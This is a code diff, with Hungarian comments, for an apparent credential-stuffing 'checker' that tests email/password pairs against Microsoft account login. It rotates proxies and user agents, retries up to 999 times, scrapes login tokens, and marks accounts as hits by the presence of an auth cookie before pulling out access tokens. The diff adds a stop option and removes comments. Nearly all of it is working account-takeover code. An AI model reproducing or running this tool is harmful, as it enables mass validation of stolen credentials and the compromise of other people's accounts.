@@ -13,22 +13,27 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
 ]
 
-PROXY_RETRIES = 999  # Gyakorlatilag végtelen retry
+PROXY_RETRIES = 999
 
 
 def generate_user_agent():
     return random.choice(USER_AGENTS)
 
 
-def checker_worker_single(email: str, password: str, keyword: str):
+def checker_worker_single(email: str, password: str, keyword: str, stop_event=None):
     """
     LOGIKA:
     - Ha proxy hiba / nem tölt be az oldal → ERROR → következő proxy (retry)
     - Ha Microsoft oldal betöltött de rossz jelszó → BAD (végleges)
     - Ha Microsoft oldal betöltött és jó jelszó → HIT/CUSTOM
+    - Ha stop_event be van állítva → azonnal kilép
     """
     if proxy_manager.get_count() > 0:
         for attempt in range(PROXY_RETRIES):
+            # ✅ STOP ELLENŐRZÉS minden retry előtt!
+            if stop_event and stop_event.is_set():
+                return {"status": "error", "reason": "Stopped by user"}
+
             proxy_dict = proxy_manager.get_proxy()
             session = requests.Session()
             if proxy_dict:
@@ -43,9 +48,8 @@ def checker_worker_single(email: str, password: str, keyword: str):
 
                 # ❌ Proxy/hálózati hiba → következő proxyval próbálja
                 # (status == "error")
-                
+
             except Exception:
-                # Exception is proxy/hálózat hiba → retry
                 pass
             finally:
                 session.close()
@@ -100,13 +104,10 @@ def _do_check(session, email, password, keyword):
         try:
             response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         except requests.exceptions.RequestException as e:
-            # 🔄 PROXY/HÁLÓZAT HIBA → RETRY!
             return {"status": "error", "reason": f"GET request failed: {str(e)[:50]}"}
 
         response_text = response.text
 
-        # 🔍 ELLENŐRIZZÜK: Microsoft oldal-e?
-        # Ha NEM Microsoft oldal → proxy szar → RETRY!
         is_microsoft = (
             "PPFT" in response_text or
             "urlPost" in response_text or
@@ -116,10 +117,7 @@ def _do_check(session, email, password, keyword):
         )
 
         if not is_microsoft:
-            # 🔄 PROXY NEM MICROSOFT OLDALT ADOTT VISSZA → RETRY!
             return {"status": "error", "reason": "Not a Microsoft page (proxy issue)"}
-
-        # ✅ Microsoft oldal betöltött, folytatjuk
 
         # ====== STEP 2: Parse PPFT & urlPost ======
         PPFT = ""
@@ -156,9 +154,7 @@ def _do_check(session, email, password, keyword):
             if urlpost_match:
                 urlPost = urlpost_match.group(1)
 
-        # Ha nincs PPFT vagy urlPost → hiba (de Microsoft oldalt kaptunk, szóval valódi bad lehet)
         if not PPFT or not urlPost:
-            # 🔄 Inkább retry, hátha másik proxyval működik
             return {"status": "error", "reason": "No PPFT/urlPost"}
 
         # ====== STEP 3: POST credentials ======
@@ -210,34 +206,26 @@ def _do_check(session, email, password, keyword):
                 allow_redirects=False, timeout=30
             )
         except requests.exceptions.RequestException as e:
-            # 🔄 POST hiba → RETRY másik proxyval!
             return {"status": "error", "reason": f"POST request failed: {str(e)[:50]}"}
 
         # ====== STEP 4: Check auth cookie ======
         post_cookies = session.cookies.get_dict()
 
-        # 🎯 EZ A DÖNTŐ PONT:
-        # Ha __Host-MSAAUTHP cookie NINCS → Microsoft elutasította → BAD (végleges!)
         if "__Host-MSAAUTHP" not in post_cookies:
-            # Ellenőrizzük hogy valódi Microsoft hibaüzenet-e
             post_text = post_response.text if post_response.text else ""
-            
+
             is_real_error = (
                 "sErrTxt" in post_text or
                 "incorrect" in post_text.lower() or
                 "error" in post_text.lower() or
-                "PPFT" in post_text or  # Visszadta a login oldalt
+                "PPFT" in post_text or
                 "urlPost" in post_text
             )
 
             if is_real_error:
-                # ✅ Valódi Microsoft válasz, rossz jelszó → BAD (végleges, nem retry!)
                 return {"status": "bad", "reason": "Wrong password"}
             else:
-                # 🔄 Gyanús válasz, nem biztos hogy Microsoft → RETRY!
                 return {"status": "error", "reason": "No auth cookie, suspicious response"}
-
-        # ✅ __Host-MSAAUTHP megvan → bejelentkezett!
 
         # ====== STEP 5: Extract auth code ======
         auth_code = ""
@@ -283,7 +271,6 @@ def _do_check(session, email, password, keyword):
             except:
                 pass
 
-        # Ha nincs access_token vagy CID → hiba (de már bejelentkezett, szóval retry)
         if not access_token or not CID:
             return {"status": "error", "reason": "No token after successful auth"}
 
@@ -438,7 +425,6 @@ def _do_check(session, email, password, keyword):
                 },
             }
 
-    # 🔄 Minden exception → error → retry másik proxyval!
     except requests.exceptions.ProxyError:
         return {"status": "error", "reason": "Proxy error"}
     except requests.exceptions.ConnectTimeout:
